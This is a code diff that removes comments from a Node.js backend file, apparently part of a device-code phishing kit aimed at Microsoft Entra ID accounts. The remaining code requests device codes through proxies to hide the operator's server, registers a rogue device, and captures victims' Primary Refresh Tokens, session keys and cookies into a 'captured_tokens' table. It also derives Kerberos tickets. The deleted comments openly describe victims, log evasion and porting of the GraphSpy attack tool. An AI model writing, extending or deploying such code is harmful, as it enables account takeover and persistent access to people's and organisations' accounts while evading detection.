@@ -1,19 +1,3 @@
-/**
- * devicecode.js
- *
- * Backend device code flow with proxy support and PRT extraction.
- *
- * Why this exists:
- * - All outbound calls go through microsoftclient (proxied), so the VPS IP
- *   never appears in Microsoft's logs.
- * - The device_code request and every subsequent token poll MUST use the same
- *   proxy — Microsoft binds the device_code to the IP that requested it. A
- *   random proxy per call would silently break the token exchange.
- * - The PRT is returned in the Set-Cookie header of the token response as
- *   `x-ms-RefreshTokenCredential`. The old code read only `response.data`
- *   and threw those headers away, so PRTs were never captured.
- */
-
 const db = require('../database/connection');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
@@ -24,8 +8,6 @@ const forge = require('node-forge');
 const TENANT = config.AZURE_TENANT || 'common';
 const DEVICE_CODE_CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
-// ── GraphSpy exact endpoints / scopes (core/device_codes.py, core/device.py) ──
-// device_codes.generate(version=2)
 const TOKEN_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 // poll() token exchange
 const POLL_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
@@ -97,27 +79,9 @@ function generateKeyPairAndCsr(commonName) {
 }
 
 /**
- * Request a device code from Microsoft using the broker client ID and
- * the deviceRegistration scope.
- *
- * NOTE: The returned proxy must be passed to the next polling step.
- * Microsoft binds the flow to the requesting IP.
- *
  * @returns {Promise<object>}
  */
 async function requestDeviceCode() {
-  // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
-  //
-  //   body = {"client_id": client_id, "scope": scope}
-  //   if ngcmfa or cae:
-  //       body["claims"] = json.dumps({"access_token": {
-  //           "amr":    {"values": ["ngcmfa"]},      # ngcmfa
-  //           "xms_cc": {"values": ["cp1"]}}})       # cae
-  //   url = ".../common/oauth2/v2.0/devicecode"
-  //
-  // The claims are sent on EVERY request in V-C - they are not optional.
-  // amr=ngcmfa forces the victim through MFA during device-code auth and
-  // xms_cc=cp1 opts into Continuous Access Evaluation.
   const claims = {
     access_token: {
       amr: { values: ['ngcmfa'] },
@@ -154,11 +118,6 @@ async function requestDeviceCode() {
 }
 
 /**
- * GraphSpy device.generate_public_key_rsa_blob():
- *
- *   header = b"RSA1" + u32le(key_size) + u32le(len(exp)) + u32le(len(mod))
- *            + u32le(0) + u32le(0)
- *   blob   = base64(header + exp_bytes + mod_bytes)
  *
  * @param {string} publicKeyPem
  * @returns {string} base64 TransportKey
@@ -187,18 +146,11 @@ function generatePublicKeyRsaBlob(publicKeyPem) {
  * @returns {Promise<{ deviceId, deviceCertificate, privateKeyPem, csrDerBase64, deviceName }>}
  */
 async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
-  // GraphSpy device.register() uses a FIXED CSR subject CN and reads the
-  // device_id back out of the certificate AAD issues.
   const deviceName = generateDeviceName();
   const { privateKeyPem, publicKeyPem, csrDerBase64 } = generateKeyPairAndCsr(DEVICE_CSR_CN);
 
-  // GraphSpy register(target_domain=...) - defaults to e-corp.local there; here
-  // the tenant is the real domain, falling back to the same "common" sentinel.
   const targetDomain = tenant && tenant !== 'common' ? tenant : 'common';
 
-  // GraphSpy device.register() request_body - exact key set:
-  //   CertificateRequest, TransportKey, TargetDomain, DeviceType,
-  //   OSVersion, DeviceDisplayName, JoinType, attributes
   const enrollmentBody = {
     CertificateRequest: {
       Type: 'pkcs10',
@@ -225,9 +177,6 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
   };
   const drsPayload = JSON.stringify(enrollmentBody);
 
-  // The DRS endpoint is not IP-bound (unlike the device_code itself), so a
-  // dead proxy must not abort enrollment. Try the flow proxy first, then
-  // fall back to a direct request on a transport-level failure.
   let response;
   try {
     response = await ms.post(DRS_ENDPOINT, drsPayload, {
@@ -260,9 +209,6 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
 
   const data = response.data;
 
-  // GraphSpy device.register():
-  //     certificate_base64 = response_json["Certificate"]["RawBody"]
-  //     device_id          = certificate.subject COMMON_NAME
   let certRaw = data.Certificate || data.certificate || data.deviceCertificate || data.x509Certificate;
   if (certRaw && typeof certRaw === 'object') {
     certRaw = certRaw.RawBody || certRaw.rawBody || certRaw.value || null;
@@ -307,10 +253,6 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
 }
 
 /**
- * Build a client assertion JWT signed with the device private key.
- *
- * Used for RFC 7521 / RFC 7523 device-bound token renewal.
- *
  * @param {string} privateKeyPem
  * @param {string} deviceId
  * @param {string} audience
@@ -472,11 +414,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 email = payload.email || payload.upn || payload.preferred_username || null;
             } catch (e) { /* ignore decode errors */ }
         }
-
-        // Fallback PRT source: the x-ms-RefreshTokenCredential Set-Cookie.
-        // GraphSpy does NOT use this - it reads the raw PRT from
-        // request_for_device()'s response["refresh_token"]. Kept only for
-        // flows where request_for_device could not run.
         const xmsPrtCookie = parsedCookies['x-ms-RefreshTokenCredential'] || null;
         const sessionKeyJwe = parsedCookies['ESTSAUTH'] || null;
         const deviceTenantId = parsedCookies['X-Device-Tenant-Id'] || null;
@@ -536,19 +473,8 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 deviceEnrolled = false;
             }
         }
-
-        // GraphSpy device_codes.poll() auto_action == "device_prt" runs:
-        //     register(...) -> request_for_device(device_id, refresh_token_id, os_version)
-        // request_for_device POSTs a device-signed RS256 jwt to
-        // /common/oauth2/token and reads the RAW PRT out of
-        // response["refresh_token"], then RSA-OAEP decrypts session_key_jwe
-        // with the device private key. That is the real PRT acquisition path;
-        // the Set-Cookie values are only a fallback.
         let rawPrt = null;
         let sessionKeyHex = null;
-        // request_for_device() returns session_key_jwe alongside the raw PRT.
-        // It used to be dropped here, which is why captured_tokens.session_key_jwe
-        // (and therefore session_key) came back null for every capture.
         let deviceSessionKeyJwe = null;
         if (privateKeyPemForPrt && certificateForPrt && refresh_token) {
             try {
@@ -563,12 +489,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 sessionKeyHex = prtResult.sessionKeyHex;
                 if (prtResult.sessionKeyJwe) deviceSessionKeyJwe = prtResult.sessionKeyJwe;
 
-                // Persist the decrypted session key where
-                // resolveSessionKeyForToken()/getStoredSessionKey() read it -
-                // same column devicemanager.capturePrtSessionKey() writes.
-                // Upsert: the broker-enrollment path never creates the
-                // device_credentials row itself, so a bare UPDATE would
-                // silently store nothing and lose the session key.
                 try {
                     const devicemanager = require('./devicemanager');
                     await devicemanager.persistPrtSessionKey(userId, tenant, sessionKeyHex, {
@@ -584,9 +504,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 console.error('[devicecode] request_for_device failed:', prtErr.message);
             }
         }
-
-        // GraphSpy stores the RAW PRT (response["refresh_token"]). The
-        // x-ms-RefreshTokenCredential cookie is a fallback only.
         const storedPrt = rawPrt || xmsPrtCookie || null;
         const storedSessionKeyJwe = sessionKeyJwe || deviceSessionKeyJwe || null;
 
@@ -624,10 +541,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
           tokenId = insertResult.insertId;
         } catch (insertErr) {
           const msg = insertErr?.message || '';
-          // Any "Unknown column 'x' in 'field list'" means this deployment's
-          // captured_tokens is missing a column the primary INSERT needs.
-          // Degrade to the narrower legacy INSERT so the capture (and its
-          // session_key_jwe) is still recorded.
           if (/Unknown column/i.test(msg)) {
             console.warn('[devicecode] Device columns missing, falling back to legacy insert');
             const [legacyResult] = await db.query(
@@ -660,11 +573,6 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
           }
         }
 
-        // Auto-derive Kerberos TGTs now that the raw PRT + session key are
-        // stored. deriveTGTForToken() needs a raw PRT carrying acrs=pfdr,
-        // which is exactly what request_for_device() above produced; it
-        // persists the results itself. Fire-and-forget so the poll returns
-        // immediately.
         const derivedAccountType = tenant === 'common' ? 'unknown' : 'work_school';
         if (tokenId && deviceEnrolled && derivedAccountType === 'work_school'
             && tenant && tenant !== 'common' && tenant !== 'organizations') {
